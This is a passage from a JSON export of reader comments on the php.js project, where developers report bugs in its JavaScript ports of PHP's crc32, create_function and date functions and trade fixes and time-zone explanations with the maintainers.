it."}],"crc32":[{"date":"2008-04-04 19:22:33","author":"T0bsn","url":"","comment":"replace:\r\n[CODE=&quot;Javascript&quot;]if (typeof(crc) == &quot;undefined&quot;) { crc = 0; }[\/CODE]\r\nwith:\r\n[CODE=&quot;Javascript&quot;]var crc;[\/CODE]\r\n\r\n...and it works for every function exec. ;)"},{"date":"2008-04-06 10:50:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ T0bsn: I've updated the function. Thanks a lot!!"},{"date":"2011-02-18 10:49:55","author":"Marco","url":"","comment":"I think i've found a bug for this one.\nInput string: \"\\x49\\x44\\x41\\x54\\x08\\x1d\\x01\\x05\\x00\\xfa\\xff\\x00\\x79\\x00\\x00\\xff\\x02\\xe8\\x01\\x79\" (it's a substring of a png file).\nPHP crc: -1895555446\nJS crc: 756484124\n"},{"date":"2011-02-18 11:06:55","author":"Marco","url":"","comment":"This function solves the bug that i've posted: http:\/\/stackoverflow.com\/questions\/2647935\/javascript-crc32-function-and-php-crc32-not-matching"},{"date":"2011-03-20 12:19:10","author":"Benny Nissen","url":"beast.dk","comment":"Passing 'null' (javascript null) gived different values on the client and server side. I pass the value as JSON so it might get 'translated' somewhere. Just to let somebody know.\n\nBenny"},{"date":"2011-03-20 16:08:55","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"@Benny Nissen: thanks for your report. The problem was inside utf8_encode function, that for null value didn't return empty string. This is now fixed in git."},{"date":"2011-04-07 09:09:32","author":"Soulcyon","url":"http:\/\/haloindex.com","comment":"[CODE]\n        s = utf8(s);\n        var t = \"PUT THAT HUGE TABLE IN HERE\",\n            c = 0,\n            i = -1,\n            l = str.length - 1;\n        \n        c = c ^ -1;\n        while( !!(i++ - l) )\n            c = ( c >>> 8 ) ^ parseInt(t.substr( (c ^ s.charCodeAt(i) & 255) * 9, 8 ), 16);\n        return c ^ -1;\n[\/CODE]"},{"date":"2012-09-24 11:04:55","author":"doufu","url":"","comment":"thanks"}],"create_function":[{"date":"2008-08-29 09:00:00","author":"cedric","url":"","comment":"The doc states that this function &quot;Returns a unique function name as a string,&quot; like the php version would, the example code looks like it's returning the actual function, not the name of the function (in PHP, it would have named the function something like 'lambda1' and returned it).\r\n\r\nIf your other functions like array_map() expect a function instead of the function's name, it should be okay - but the documentation would still be wrong.\r\n\r\nAlso, the example is incorrect or, not clear and I'm not understanding it."},{"date":"2008-09-08 00:14:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ cedric: Hi Cedric, that's a very sharp observations. We have chosen to astray a little bit from PHP's implementation here. \r\n\r\nYou can still handle the functions in the same way as PHP:\r\n[CODE=&quot;Javascript&quot;]\r\ncall_user_func_array(create_function(), $a);\r\n[\/CODE]\r\n\r\nOnly now both methods pass actual functions instead of function names (what PHP does).\r\n\r\nIt was a trade-off, because otherwise we would have to work with global variables which would be nasty.\r\n\r\nDocumentation is currently copied 1-on-1 from the PHP site, to be 100% correct we would have to make exceptions in the documentation, but unfortunately that not our number one priority at the moment. \r\n\r\nThanks for your input."},{"date":"2010-04-28 15:19:49","author":"Diplom@t","url":"difane.com","comment":"\"You can still handle the functions in the same way as PHP:\n[CODE=&quot;Javascript&quot;]\ncall_user_func_array(create_function(), $a);\n[\/CODE]\"\n\nAcutally you can't. I've tried the following code:\n[CODE]\nvar func = create_function(\"x\", \"return x*x;\");\nvar res = call_user_func(func, 5);\n[\/CODE]\nError is being thrown:\n\"Error: undefined is not a valid function\"\n\nBut if you add the third else like the one below, everything works:\n\n[CODE]\nelse if (typeof cb == 'function')\n{\n    func = cb;\n}\n[\/CODE]"},{"date":"2010-04-28 18:42:14","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Diplom@t : thanks very much for the input. Applied in Git to call_user_func() and call_user_func_array(). See also comment at call_user_func_array."},{"date":"2011-02-01 20:48:39","author":"Seingh","url":"patronum.tk","comment":"I think that a \"different version\"of the code would be:\n[code]\nfunction create_function (args, code) {\nargs = args.split(\",\");\nreturn eval(code);\n}\n[\/code]"}],"date":[{"date":"2008-02-12 03:06:56","author":"Adam","url":"","comment":"I have been trying to use this date function in a project of mine using JScript, and have encountered a few difficulties.\r\n\r\nThe first problem I encountered was that when using either F or M for a month, The function will show the month in advance. m still shows the correct numerical value however. The reason this happens is that the array created with the constants for the months is zero-based. Adding an empty sting before &quot;January&quot; fixes this.\r\n[code=&quot;Javascript&quot;]    var txt_months =  [&quot;&quot;,&quot;January&quot;, &quot;February&quot;, &quot;March&quot;, &quot;April&quot;,\r\n        &quot;May&quot;, &quot;June&quot;, &quot;July&quot;, &quot;August&quot;, &quot;September&quot;, &quot;October&quot;, &quot;November&quot;,\r\n        &quot;December&quot;];[\/code]\r\n\r\nNext problem was that P was giving me an error [code=&quot;text&quot;]Error: Object doesn't support this property or method (code: -2146827850)\r\n       File: php.date.js. Line: 197.\r\n[\/code]\r\nLine 197 is &quot;var O = jsdate.O();&quot; within the function for P. First, jsdate.O() should be f.O(). Then comes the problem that the function O does not output the correct output. I have re-written the function for O so it produces the correct output:\r\n[code=&quot;Javascript&quot;]O: function(){\r\n   var t = pad(Math.abs(jsdate.getTimezoneOffset()\/60*100), 4);\r\n   if (jsdate.getTimezoneOffset() &gt; 0) t = &quot;-&quot; + t; else t = &quot;+&quot; + t;\r\n   return t;\r\n}[\/code]\r\n\r\nFinally, the function U is missing the return keyword.\r\n\r\n\r\nCheers,\r\nAdam"},{"date":"2008-02-12 08:14:13","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Adam: Thanks a lot for not only pointing this out, but also for taking the extra effort to provide the fixes. Appreciated!"},{"date":"2008-02-12 21:52:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Adam (MeEtc): I've updated the credits!"},{"date":"2008-03-02 04:14:53","author":"Michael White","url":"","comment":"The example results are incorrect for this function ( I double checked it by running it in PHP itself).\r\n\r\nThe new examples are:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\t\t\/\/ *     example 1: date('H:m:s \\\\m \\\\i\\\\s \\\\m\\\\o\\\\n\\\\t\\\\h', 1062402400);\r\n\t\t\/\/ *     returns 1: '03:09:40 m is month'\r\n\t\t\/\/ *     example 2: date('F j, Y, g:i a', 1062462400);\r\n\t\t\/\/ *     returns 2: 'September 1, 2003, 8:26 pm'\r\n[\/CODE]\r\n\r\nhttp:\/\/crestidg.com"},{"date":"2008-03-02 11:53:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: Tried to reproduce the behavior, but wasn't able to:\r\nhttp:\/\/kevin.vanzonneveld.net\/test.php"},{"date":"2008-03-02 18:16:10","author":"Michael White","url":"","comment":"VERY strange.... I bet it has something to do with the PHP version installed on different servers. I have tested on my local server as well as on a shared host (both are PHP5).\r\n\r\nThe one hosted on the shared host is here:\r\n\r\nhttp:\/\/sprinkit.net\/aether\/test.php\r\n\r\n[CODE=&quot;php&quot;]\r\n&lt;?php\r\n\r\necho &quot;date('H:m:s \\\\m \\\\i\\\\s \\\\m\\\\o\\\\n\\\\t\\\\h', 1062402400)&quot;;\r\necho &quot;&lt;br \/&gt;&quot;;\r\necho date('H:m:s \\m \\i\\s \\m\\o\\n\\t\\h', 1062402400);#09:09:40 m is month\r\necho &quot;&lt;br \/&gt;&quot;;\r\n\r\n\r\necho &quot;mktime( 14, 10, 2, 2, 1, 2008 )&quot;;\r\necho &quot;&lt;br \/&gt;&quot;;\r\necho mktime( 14, 10, 2, 2, 1, 2008 );\r\n\r\n\r\n?&gt;\r\n[\/CODE]\r\n\r\nThat is the exact code I used to duplicate your test.php page. I assume it is identical as far as process.\r\n\r\nAnyway - I noticed these on the php.js test page because they turned red when I ran them. The whole page fails to run in IE 7, IE 6, and Safari 3; it just hangs. It runs in Opera 9 and FF2 (win &amp; mac) and in all three browser where it works I get red box with the output matching that of my PHP test page. When I ran my own tests while creating the namespaced version I found that IE 7, IE 6, and Safari 3 also produce the same output (matching my PHP test page)."},{"date":"2008-03-02 19:22:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Here's mine:\r\n[CODE=&quot;php&quot;]\r\n&lt;?php\r\necho &quot;date('H:m:s \\\\m \\\\i\\\\s \\\\m\\\\o\\\\n\\\\t\\\\h', 1062402400)&quot;.&quot;&lt;br \/&gt;&quot;;\r\necho date('H:m:s \\m \\i\\s \\m\\o\\n\\t\\h', 1062402400).&quot;&lt;br \/&gt;&quot;;\r\n\r\necho &quot;mktime( 14, 10, 2, 2, 1, 2008 )&quot;.&quot;&lt;br \/&gt;&quot;;\r\necho mktime( 14, 10, 2, 2, 1, 2008 ).&quot;&lt;br \/&gt;&quot;;\r\n?&gt;\r\n[\/CODE]\r\n\r\nThis boggles me, could it have anything to do with timezones &amp; locales?"},{"date":"2008-03-03 15:09:23","author":"Michael White","url":"","comment":"I believe it just might... but it shouldn't... should it?\r\n\r\nMy Time Zone is GMT -5 (Eastern Standard Time) I live in Atlanta, Georgia (United States of course). What's your timezone? I noticed it was quite a bit different from mine because I posted a comment around 8 PM on March 2nd and it posted as March 3rd.\r\n\r\nAh! Actually, I have an idea. When I get a chance I am going to calculate the difference between your timezone and mine in seconds since the epoch. Then we can check that difference against the difference we get out of this function to make sure it is just a timezone difference and not a bug."},{"date":"2008-03-03 17:07:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Michael White: I'm Amsterdam GMT +1 CET. \r\nSo that seems to be the 6 hours difference we're experiencing! I had never realized that this would have impact on UNIX epoch. Apparently it does :("},{"date":"2008-03-04 01:04:17","author":"Michael White","url":"","comment":"Now to figure out how to write a test scenario that isn't affected by differences from the GMT.... If it even makes sense to do so, which it may not since the functions that rely on the UNIX epoch seem to work correctly other than the actual time difference between locales. It seems to me as if the UNIX epoch ignores timezones itself so that it calculates the correct date\/time anywhere around the world at an exact moment in time rather than a relative moment in time (relative to a timezone). I hope I am making sense here."},{"date":"2008-03-04 19:58:12","author":"Brad Touesnard","url":"","comment":"There's a bug in the f.M() function.  It should be t = f.F(); instead of t = f.n();\r\n\r\nGreat project, keep it up!"},{"date":"2008-03-04 23:23:16","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: epoch is seconds since januari 1st  1970 00:00. I think for you, that moment (epoch) happened that's 6 hours later than for me. Time is relative so epoch is too. I hope I make sense as well ;)\r\n\r\n@ Brad Touesnard: Thanks alot I will process your fix tomorrow!"},{"date":"2008-03-05 02:26:05","author":"Michael White","url":"","comment":"I'm not sure about that (but I could be wrong). The reason is because if the epoch was relative to time zones then the seconds since that time would not be affected by the time zones. Example: If epoch 0000000 were based on time zones then 50000 seconds after that would have the same exact date and time output no matter what time zone you were in. However, if the epoch is a single point in time across the entire world regardless of time zone then 50000 seconds after the epoch for your time zone would then be 6 hours different (date\/time wise) than 50000 seconds after the epoch in my time zone. I think that's logically correct but this topic is bending my brain a little bit. Maybe I should just Google it. :)"},{"date":"2008-03-05 02:33:18","author":"Michael White","url":"","comment":"Haha! Yay for Google and Wikipedia: http:\/\/en.wikipedia.org\/wiki\/Unix_time\r\n\r\n\r\nIn the first paragraph on that page it says that the epoch is &quot;the number of seconds elapsed since midnight Coordinated Universal Time(UTC) of January 1, 1970, not counting leap seconds&quot; which means that the epoch is in fact a single, non-relative point in time rather than a point in time relative to the time zones (since UTC time is always UTC time even if you are in Australia). I think the definition is a hundred percent more clear than my jumbled explanation of it! haha"},{"date":"2008-03-05 17:29:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: Google FTW indeed :) Still curious why we're experiencing the difference then though."},{"date":"2008-03-05 17:56:58","author":"Michael White","url":"","comment":"According the epoch definition it makes complete sense that our time zones would affect the output of what appears to be the same date. Explanation below.\r\n\r\n\r\nFor our purposes: UTC = GMT &amp;&amp; GMT = UTC \/\/ They never differ by more than 0.9 seconds\r\n\r\n\r\nIf the epoch was set in UTC time then UTC +1 = CET (your time zone). That means that 00000 seconds in UTC time is equal to 03600 seconds in CET time.\r\n\r\n\r\nThat also means that 00000 seconds in UTC time is equal to -18000 seconds in EST (my time zone).\r\n\r\n\r\nThe final result is that any given point in UNIX epoch time is exactly 21600 seconds different between our time zones (6 hours) which will yield a different date for the same epoch second depending on your time zone.\r\n\r\n\r\nLayman's terms: UNIX epoch uses UTC zone as &quot;home&quot;. If you &quot;travel&quot; outside that zone then you have to take that difference into account. When it was midnight January 1st, 1970 in the UTC zone it was still December 31st here in my time zone. Therefore the &quot;0&quot; second of the UNIX epoch will represent the date Dec. 31, 1969 for EST and will read correctly for you since it was already Jan. 1st 1970 in CET when the unix epoch was set.\r\n\r\n\r\nI think that out of those explanations you should find one that makes sense to you."},{"date":"2008-03-05 23:24:12","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Yeah it does. That's actually what I meant before but the UTC being a 'Universal Time' got me all confused again ;) Time problems tend to do that to me :)"},{"date":"2008-03-06 07:52:05","author":"Michael White","url":"","comment":"Haha, that's ok. I can't pretend that it isn't confusing. I guessed correctly the first time way back at the beginning of this saga but it took me a little while and a bit of research into the subject before I really was able to wrap my head around it. :)"},{"date":"2008-04-11 03:49:41","author":"Tim Wiel","url":"","comment":"Calling [CODE=&quot;javascript&quot;]$PHP_JS.date(); [\/CODE] doesn't return todays date in Mozilla Firefox 2.0.13 on Ubuntu Linux\r\n\r\nTo fix it I changed the line reading \r\n\r\n[CODE=&quot;Javascript&quot;]jsdate = new Date(timestamp ? timestamp * 1000 : null);[\/CODE]\r\n\r\nto read \r\n\r\n[CODE=&quot;Javascript&quot;]jsdate=((timestamp) ? new Date(timestamp*1000) : new Date())[\/CODE]"},{"date":"2008-04-11 12:08:18","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Tim Wiel: Thanks alot for sharing your improvement Tim!"},{"date":"2008-05-21 23:11:44","author":"Bob","url":"","comment":"Very interesting project. I came across your date function while looking for an easy way to detect a user's local timezone abbreviation. But your timezone options don't appear to work yet. Is that a known issue? Any other suggestions?"},{"date":"2008-05-22 08:00:21","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Bob: Thanks. Maybe you could use js' native getTimezoneOffset()\/60 ?"},{"date":"2009-01-06 16:30:46","author":"Bryan Elliott","url":"","comment":"Implementation of I:\r\n[CODE=&quot;Javascript&quot;]\r\nI: function(){\r\n\tvar \r\n\t\tDST = (new Date(jsdate.getFullYear(),6,1,0,0,0)),\r\n\t\tDST = DST.getHours()-DST.getUTCHours(),\r\n\t\tref = jsdate.getHours()-jsdate.getUTCHours();\r\n\treturn ref!=DST?1:0;\r\n},\r\n\r\n[\/CODE]"},{"date":"2009-01-06 17:24:41","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Bryan Elliott: Thanks a lot Bryan!"},{"date":"2009-01-07 02:16:07","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Two small additions:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n           u: function(){\r\n                return pad(jsdate.getMilliseconds()*1000, 6);\r\n            },\r\n[\/CODE]\r\n[CODE=&quot;Javascript&quot;]\r\n            Z: function(){\r\n               var t = -jsdate.getTimezoneOffset()*60;\r\n               return t;\r\n            },\r\n[\/CODE]\r\n\r\nNote also that your chart should change the description of 'u' from &quot;milliseconds&quot; to &quot;microseconds&quot; per the current PHP documentation for date()."},{"date":"2009-01-07 02:34:47","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's one more...\r\n\r\nThanks for the idea to check the source code. It gave this one away...\r\n\r\n            [CODE=&quot;Javascript&quot;]r: function(){\r\n                return f.D()+', '+f.d()+' '+f.M()+' '+f.Y()+' '+f.H()+':'+f.i()+':'+f.s()+' '+f.O();\r\n            },[\/CODE]"},{"date":"2009-01-07 03:49:49","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's 'o' with some tests confirming it works (I tested the others too) \r\n[CODE=&quot;Javascript&quot;]alert(date('Y W o', Date.UTC(2008,11,28)\/1000)) \/\/ normal \r\nalert(date('Y W o', Date.UTC(2008,11,29)\/1000)) \r\nalert(date('Y W o', Date.UTC(2011,0, 3)\/1000))\r\nalert(date('Y W o', Date.UTC(2010,0, 3)\/1000))\r\nalert(date('Y W o', Date.UTC(2010,0, 4)\/1000)) \/\/ normal\r\n[\/CODE]\r\n\r\n[CODE=&quot;Javascript&quot;]o: function(){\r\n                if (f.n() === 12 &amp;&amp; f.W() === 1) {\r\n                    return jsdate.getFullYear()+1;\r\n                }\r\n                if (f.n() === 1 &amp;&amp; f.W() &gt;= 52) {\r\n                    return jsdate.getFullYear()-1;\r\n                }\r\n                return jsdate.getFullYear();\r\n            },[\/CODE]\r\n\r\nNow, it looks like we only have the timezone identifiers, 'e' and 'T' left to do."},{"date":"2009-01-07 05:49:57","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Despite my comment just now about not porting list(), if you can make a small exception for working around the desire to copy PHP behavior perfectly, the following will work if the last argument is the array to be assigned to list() instead of as an assignment (list is a language construct and not a function anyways):\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/\/ Only works in global context\r\nlist('drink', 'color', 'power', ['coffee', 'brown', 'caffeine']);\r\nfunction list () {\r\n    var arr = arguments[arguments.length-1]\r\n    for (var i=0; i &lt; arr.length; i++) {\r\n        this[arguments[i]] = arr[i];\r\n    }\r\n}\r\nalert(drink +' is '+color+' and '+power +' makes it special.\\n'); \/\/ Example from PHP manual\r\n[\/CODE]"},{"date":"2009-01-07 05:50:57","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, meant to post my last comment over at PHP JS Namespaced instead..."},{"date":"2009-01-07 14:17:21","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Excellent Work Brett, amazing that we have the date function almost complete! Thx"},{"date":"2009-01-10 05:28:40","author":"David Randall","url":"","comment":"Rather than strictly adhering to the PHP version for the 2nd argument, I suggest checking for the Javascript Date() object. Consider the following:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\ndate('Y m d'); \/\/ 2009 01 09\r\ndate('Y m d', time()); \/\/ 2009 01 09\r\ndate('Y m d', new Date()); \/\/ 40996 08 16\r\ndate('Y m d', (new Date()).getTime()\/1000); \/\/ 2009 01 09\r\n(new Date()).getTime()\/1000; \/\/ 1231560959.38\r\ntime(); \/\/ 1231560959\r\n[\/CODE]\r\n\r\nThe third line doesn\u00e2\u20ac\u2122t produce the correct value because date() is expecting an integer as the 2nd argument. To make this easier for Javascript dates, I suggest changing the following\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar a, jsdate=((timestamp) ? new Date(timestamp*1000) : new Date());\r\n[\/CODE]\r\n\r\nto \r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar a, jsdate=(\r\n        (typeof(timestamp) == 'undefined') ? new Date() : \/\/ Not provided\r\n        (typeof(timestamp) == 'number') ? new Date(timestamp*1000) : \/\/ UNIX timestamp\r\n        new Date(timestamp) \/\/ Javascript Date()\r\n    );\r\n[\/CODE]"},{"date":"2009-01-13 00:04:36","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ David Randall: I had no issues running your 3rd example in our testsuite. Maybe it's browser-specific? I've added your code anyway, because it doesn't hurt any other testcase, and I agree that your 3rd example should work. Thanks for contributing!"},{"date":"2009-07-21 22:33:32","author":"Paul","url":"","comment":"I try this function and it doesn't work like the php's function, at least in my test.\n[CODE]\ndate('d\/m\/Y', 1247788516)\n[CODE]\nit return: NaN\/NaN\/NaN\n\nand php's function return: 16\/07\/2009\n\nRegards"},{"date":"2009-07-24 12:26:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paul: I wasn't able to reproduce that. Are you using the latest version? Which browser\/interpreter are you testing this in?"},{"date":"2009-08-12 10:17:03","author":"majak","url":"","comment":"This line:\n[CODE]\n$P.date('W', $P.strtotime('2005-01-01'));\n[\/CODE]\nreturns 0 instead of 53.\n(Verified in PHP. Problem is in function date, not strtotime.)\nI used the latest minified and namespaced version."},{"date":"2009-08-12 14:40:46","author":"majak","url":"","comment":"I found another bug. Format character 'N' doesn't work according to the specification.\nIt is easy to fix. Just replace \"return f.w() + 1;\" on line 92 \nwith \"return f.w() ? f.w() : 7;\" or something in that manner."},{"date":"2009-08-16 16:01:35","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ majak: Great stuff! Thanks so much. I've fixed it in SVN"},{"date":"2009-09-18 02:55:30","author":"Alex","url":"","comment":"Having the same issue as Paul\n\n[CODE]\ndate('Y-m-d',data.ts)\n[\/CODE]\n\nis returning NaN-NaN-NaN"},{"date":"2009-09-18 05:45:54","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Alex: As Kevin asked Paul, are you using the latest version? What browser? Have you tried placing alerts within the date() function to see at least where things go wrong?"},{"date":"2009-09-18 05:47:09","author":"Alex","url":"","comment":"I altered the code from the above code (marked as version 909.322 (had the same issue in code marked 2.91)) by deleting lines 37-41 and inserting at line 37:\n\n[CODE]\nvar jsdate = new Date();\njsdate.setTime(timestamp * 1000);\n[\/CODE]"},{"date":"2009-09-18 05:53:37","author":"Alex","url":"","comment":"I should mention that I first encountered this issue in Chrome 3, and tested my fix in Chrome 3, FF 3.5, IE8, Safari 3.2.2, and Opera 9.64 all on Windows XP."},{"date":"2009-09-18 08:37:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Alex: Thanks. Now, what data did you have in \"data.ts\" and what type (Number, Date object?). And though I don't think it would matter in this case, are you using a Unix timestamp as in seconds (as in PHP), or a JavaScript value in milliseconds?"},{"date":"2009-09-18 20:09:23","author":"Alex","url":"","comment":"@Brett It was a standard unix timestamp in seconds. (meant to indicate that in my inital post). It appears that the original source code handled a conversion (line 39 in v909.322).\n\nI imagine that was written this way in the first place to handle PHP defaulting to mktime() if the 2nd argument isn't set, but I don't see anywhere where that actually happens, thus if the typeof(timestamp) fails there is no value when the JS Date() methods are called."},{"date":"2009-09-18 20:26:43","author":"Alex","url":"","comment":"@Brett Don't think it would matter, but my timestamp comes from JSON obtained by jQuery."},{"date":"2009-09-19 04:31:44","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Alex: The issue should be fixed now. Our date functions were only accepting \"undefined\" (or missing) timestamps, numeric timestamps, or JavaScript Date() object timestamps. If they were expressed as a string or other non-object types, there was no attempt to auto-convert them (as PHP does). It seems therefore that your JSON was returning timestamps as strings and not numbers, thus causing a mismatch. However, the latest version in git can handle the strings now too: http:\/\/github.com\/kvz\/phpjs\/commits\/master\/functions\/datetime\/date.js\/8a428dccc64253a59b84b692fbfe323f5e9d29c9 . FYI, you might want to check out https:\/\/developer.mozilla.org\/en\/Core_JavaScript_1.5_Guide\/Operators\/Special_Operators#conditional_operator to understand what the code at the beginning of the function is doing when assigning timestamp to a Date object, if you were not clear. Have fun!"},{"date":"2009-10-25 14:26:29","author":"Theriault","url":"","comment":"'B' could be simplified to:\r\n\r\n[CODE]\r\nreturn pad(Math.floor(((t.getUTCHours() * 36e2) + (t.getUTCMinutes() * 60) + t.getUTCSeconds() + 36e2) \/ 86.4) % 1e3, 3);\r\n[\/CODE]"},{"date":"2009-10-25 14:34:13","author":"Theriault","url":"","comment":"'t' could be shortened to:\r\n\r\nreturn (new Date((f.n() + 1) + '\/0\/' + f.Y())).getDate();"},{"date":"2009-10-30 19:02:27","author":"Theriault","url":"","comment":"I found a bug with 'W'. For 2010, week 52 runs from 12\/27\/2010 to 12\/31\/2010 (only 5 days), then 1\/1\/2011 is week 53, then 1\/2\/2011 to 1\/3\/2011 are the last two days of week 52. Then week 1 is 1\/4\/2011 to 1\/9\/2011 (only 6 days). It seems to happen on other dates, too, with some weeks having only 6 days and some having 8 days."},{"date":"2009-11-07 18:13:35","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Hey Theriault, thanks for your improvements. I've just added them to the repo.\nhttp:\/\/github.com\/kvz\/phpjs\/commit\/0a830484289ece0cebdbf6d2fafe849b9308284b\n\nAs for the W: issue, I've added a testcase (#8) that confirms we stray from PHP's behavior there () (but it seems PHP in turn strays from my System's calendar ; ), this will require a quiet sunday afternoon of tesing & fixing though..\nIf anyone is up for a challenge, that would rock! :D"},{"date":"2009-11-07 18:20:47","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Does anyone know whether the technique of setting a date to '0' to get the last day of the month (as used in Theriault's 't' implementation) part of the ECMAScript spec or is it just a browser convention?"},{"date":"2009-11-08 04:17:48","author":"Theriault","url":"","comment":"@Brett: I was unsure, but after reviewing ECMA-262, it is a part of the ECMA standards. The standards state that date arguments are to be treated as finite integers and they all support values outside the ranges (such as 13, 1000, or even -500 for the month). The date argument formula is:\r\n\r\nDay(Result(7)) + Result(4) \u2212 1.\r\n\r\nDay(Result(7)) returns the computed days since Jan 1, 1970 for the current time's year and month, Result(7), plus Result(4) which is the integer date argument, so 0 would add no days to the first of the calculated month and year, then it subtracts one day to account for the first day of the month which was included in the calculation of Result(7), so that would be the previous month's last day.\r\n\r\nI would have to say that the algorithm's that ECMA has laid out for date handling are the best I've seen out there; very flexible. To think that Date.setDate(Date.getDate() - 7) subtracts one week exactly, or Date.setMonth(Date.getMonth() - 6) can subtract half a year is fantastic, no matter the date.\r\n\r\nHowever, the way I did it is incorrect. A string argument being passed to the Date constructor may be handled differently by all browsers. 't' should be changed to use 3 integers in the constructor instead:\r\n[CODE]\r\nreturn (new Date(f.Y(), f.n() + 1, 0).getDate();\r\n[\/CODE]\r\n\r\nI believe I have found the solution to 'W', also. The following should work after reviewing ISO-8601 algorithms for calculating the week. I have confirmed it works from Jan 1 1900 to Dec 32 2100, which is likely enough testing:\r\n[CODE]\r\nreturn 1 + Math.round(((c = new Date(d.Y(), d.n() - 1, d.j() - d.N() + 3)) - (new Date(c.getFullYear(), 0, 4))) \/ 864e5 \/ 7);\r\n[\/CODE]"},{"date":"2009-11-08 05:10:04","author":"Theriault","url":"","comment":"The return function at the bottom could be shortened to one line using a ternary operator:\r\n[CODE]\r\nreturn format.replace(\/\\\\?([a-z])\/gi, function (t, s) {return f[t] ? f[t]() : s;});\r\n[\/CODE]\r\n\r\n\"I\" could not rely on the _dst function up top and be shortened to one line:\r\n[CODE]\r\nreturn 0 + (t.getTimezoneOffset() < Math.max((new Date(d.Y(), 0, 1)).getTimezoneOffset(), (new Date(d.Y(), 6, 1)).getTimezoneOffset()));\r\n[\/CODE]\r\n\r\nAnd a bunch of little nitpicky fixes that I can suggest:\r\n\r\ntxt_weekdays at the top could remove the repeat of 'day' 7 times and just add 'day' to the 'l' (lowercase-L) function:\r\n[CODE]\r\nvar txt_weekdays = [\"Sun\", \"Mon\", \"Tues\", \"Wednes\", \"Thurs\", \"Fri\", \"Satur\"];\r\n\r\nreturn txt_weekdays[f.w()] + 'day';\r\n[\/CODE]\r\n\r\n'N' could be like 'g' and use the OR operator to make it a little shorter:\r\n[CODE]\r\nreturn f.w() || 7;\r\n[\/CODE]\r\n\r\n'S' could also use the OR operator to make it a bit shorter:\r\nreturn txt_ordin[f.j()] || 'th';\r\n\r\n'o' (lowercase O) could be shortened to one line:\r\nreturn f.Y() + (f.n() == 12 && f.W() < 9 ? -1 : (f.n() == 1 && f.W() > 9 ? 1 : 0));\r\n\r\n'M' could be one line:\r\n[CODE]\r\nreturn f.F().slice(0, 3);\r\n[\/CODE]\r\n\r\n'D' could be one line:\r\n[CODE]\r\nreturn f.l().slice(0, 3);\r\n[\/CODE]\r\n\r\nThanks. Keep up the good work PHP.JS."},{"date":"2009-11-08 16:42:37","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Hey there Theriault!\n\nBlown away by your expertise & quality of code. Let me try to reach you by mail and see if you'd like to append the code  another way ; )\n\nIf you haven't received my mail drop another line here, ok?"},{"date":"2009-11-12 15:09:48","author":"Felix Blaschke","url":"","comment":"The \"W\" function is wrong. For example for the 2nd january 2005 it returns the wrong weak number. I correct it myself with another algorithm:\n\n[CODE]\n        \/\/ Week\n            W: function () {\n            \tvar x = (new Date(jsdate.getFullYear(), 0, 4))\n            \tvar a = new Date(jsdate.getFullYear(), 0, 4-(x.getDay()==0 ? 7:x.getDay()-1))\n        \t\tfor (var w=0; w <= 53; w++) {\n            \t\tvar b = new Date(a.getFullYear(), a.getMonth(), a.getDate()+(w-1)*7, 0,0,0,0)\n            \t\tvar c = new Date(a.getFullYear(), a.getMonth(), a.getDate()+w*7, 0,0,0,0)\n            \t\tif (jsdate >= b && jsdate < c) {break;}\n            \t}\n            \tif (w >= 1 && w <= 52) {return w;}\n            \tif (w >= 52 && w != ((new Date(jsdate.getFullYear(),0,1)).getDay() == 4 ? 53 : 52)) {return 1;}\n            \treturn ((new Date(jsdate.getFullYear(),0,1)).getDay() == 4 ? 53 : 52);\n            },\n[\/CODE]"},{"date":"2009-11-12 15:12:18","author":"Felix Blaschke","url":"","comment":"Sorry for repost: I mean 2nd january 2006 returns wrong week number.\n[CODE]\nphp.date(\"W\", new Date(2006,0,2)) \/\/ correct result would be \"1\"\n[\/CODE]"},{"date":"2009-11-26 13:16:25","author":"Thomas Beaucourt","url":"http:\/\/www.webapp.fr\/","comment":"The \"z\" function is buggy.\nIt doesn't account for daylight saving time when doing :\n[CODE]\n(jsdate - new Date(jsdate.getFullYear() + 